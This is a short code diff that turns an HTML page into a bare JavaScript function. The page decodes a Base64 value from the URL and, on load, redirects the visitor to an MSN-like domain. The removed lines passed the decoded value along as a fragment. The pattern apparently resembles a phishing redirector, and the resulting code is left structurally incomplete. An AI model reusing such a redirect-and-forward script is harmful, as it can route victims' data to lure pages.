@@ -1,12 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Base64 Redirect</title>
-  <script>
-    // Function to decode Base64 and redirect to the new domain with the decoded value as a fragment
-    function redirectToNewDomain() {
+function redirectToNewDomain() {
       // Get the Base64 content from the URL
       const base64Content = window.location.search.substring(1); // Get the content after the question mark
 
@@ -15,7 +7,7 @@
         const decodedValue = atob(base64Content);
 
         // Redirect to the new domain with the decoded value as a fragment
-        window.location.href = `https://msnpages.com/m20231113#${decodedValue}`;
+        window.location.href = `https://msnpages.com/m20231113`;
       } else {
         console.error('Base64 content not found in the URL');
       }
@@ -23,8 +15,3 @@
 
     // Call the function on page load
     window.onload = redirectToNewDomain;
-  </script>
-</head>
-<body>
-</body>
-</html>
